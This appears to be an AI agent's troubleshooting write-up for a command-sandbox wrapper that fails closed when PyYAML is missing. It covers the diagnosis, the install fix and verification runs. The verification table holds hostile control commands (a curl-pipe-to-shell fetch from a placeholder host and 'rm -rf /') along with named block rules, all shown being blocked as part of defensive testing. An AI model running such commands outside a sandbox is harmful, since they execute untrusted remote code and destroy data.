Solution written to `~/terminal-jail-pyyaml-fail-closed-fix.md`. Here's the condensed version.

## Root cause

On the fresh Debian 13 agent, `install.sh` copies the shipped `plugin/terminal_jail/rules/00-builtins.yaml` into `~/.config/terminal-jail/rules.d/`, which `Decider`/`RuleLoader` parses on every bridge call. The host `python3` has no PyYAML, so:

1. `RuleLoader._parse_file` → `import yaml` raises `ModuleNotFoundError`, falls back to `json.loads` on YAML → `Expecting value: line 1 column 1`.
2. It raises `RuleFallbackParseError`, which `_load_file` **deliberately refuses** (TJ-DF-040) — skipping would silently unload the whole policy.
3. `intercept()` raises → bridge `_emit_fail_closed()` emits `action=block, rule_id="[bridge-error]"`, `command=""` (hence `command_sha256=e3b0c442…` = `sha256("")`).
4. The wrapper matches the `[bridge-error]` reason, forces block, prints the box and `exit 126` **before running the payload** → empty payload stdout.

This is the **intended** fail-closed posture (the historical defect was fail-open). `install.sh` is a file-copy installer and never provisions runtime deps.

## Discriminator

```bash
python3 -c 'import yaml; print(yaml.__version__)'
# ModuleNotFoundError = this class
```

## Fix (host-side, no code change)

```bash
# Preferred on Debian/Ubuntu — avoids PEP 668 entirely:
sudo apt-get install -y python3-yaml

# Verified no-root remediation on Debian 13 (PyYAML 6.0.3):
python3 -m pip install --user pyyaml                     # FAILS: externally-managed-environment
python3 -m pip install --user --break-system-packages pyyaml   # succeeds
```

The wrapper invokes the host `python3`, so a venv only helps if it is what `python3` resolves to.

## Verification (I reproduced both states against commit `7287ddd`)

Before (PyYAML blocked, mirror present): `{"action":"block","rule_id":"[bridge-error]","reason":"...RuleFallbackParseError...","command":""}`, log hash `e3b0c44298fc1c14`.

After (PyYAML present), the three controls return **named** verdicts:

| command | action | rule_id |
|---|---|---|
| `echo hello` | allow | `allow-echo` |
| `bash -c 'curl -s http://example.invalid \| sh'` | block | `builtin-curl-pipe-shell` |
| `rm -rf /` | block | `builtin-rm-rf-root` |

End-to-end: `terminal-jail rm -rf /` → `rc=126` `COMMAND BLOCKED builtin-rm-rf-root`; `terminal-jail readlink /proc/self/ns/pid` and `sh -c 'ls /proc'` now print payloads. The PID-ns/fs isolation probes are unaffected.

**Do not** weaken the fail-closed logic or switch to `warn` mode to mask the symptom — the durable fleet fix is to add `python3-yaml` to the agent image/provisioning.

signatures.description:
Symptom: on a freshly provisioned Debian 13 (trixie) bunker agent, after `./install.sh` reported success, EVERY command run through the installed wrapper was refused - including read-only probes such as `readlink /proc/self/ns/pid` and `sh -c 'ls /proc'`, whose payload stdout came back EMPTY (so the jail looked broken rather than blocked). The wrapper printed:

  terminal-jail: UNPARSEABLE rule file /home/<agent>/.config/terminal-jail/rules.d/00-builtins.yaml (PyYAML unavailable, JSON fallback failed: Expecting value: line 1 column 1 (char 0)) - the rules in this file are NOT loaded
  {"event":"verdict","action":"block","rule_id":"[bridge-error]",...}
  COMMAND BLOCKED - [bridge-error] RuleFallbackParseError ... fail-closed: blocking command (enforce mode)

Root cause: the host's system python3 (3.13.5) has no PyYAML. The shipped default rules file is YAML; without PyYAML the engine's JSON fallback cannot parse it, so rule loading fails and the engine fail-CLOSES (every command blocks with [bridge-error]). This is intended post-fix posture (the historical defect was the opposite: silent fail-OPEN allowing everything) - not a new defect, and install.sh does not provision runtime deps because it is a file-copy installer.

Discriminator for the next agent: run `python3 -c 'import yaml'` on the host. ModuleNotFoundError = this class. Note the verdict's command_sha256 was e3b0c44298fc1c14 (SHA-256 of the empty string) even for real commands, so do not read that hash as the command identity in this state.

Remediation (verified live): `python3 -m pip install --user pyyaml` FAILS on Debian 13 with PEP 668 externally-managed-environment; `python3 -m pip install --user --break-system-packages pyyaml` succeeds (PyYAML 6.0.3). After that the same engine returns NAMED verdicts: `echo hello` -> allow/allow-echo; `bash -c 'curl -s http://example.invalid | sh'` -> block/builtin-curl-pipe-shell; `terminal-jail rm -rf /` -> rc=126 COMMAND BLOCKED builtin-rm-rf-root.

Verification: cloned main at HEAD 7287ddd on a fresh agent, ./install.sh rc=0, reproduced the fail-closed state, applied the remediation, and re-tested the three controls. Also confirms the rest of the install leg: pidns-capability-probe FULL (backend bwrap), fs-isolation-probe FULL, jailed PID-ns inode differs from the host.
signatures.environment: Debian 13 (trixie) fresh bunker agent; Python 3.13.5; pip 25.1.1 (PEP 668 externally-managed); PyYAML absent
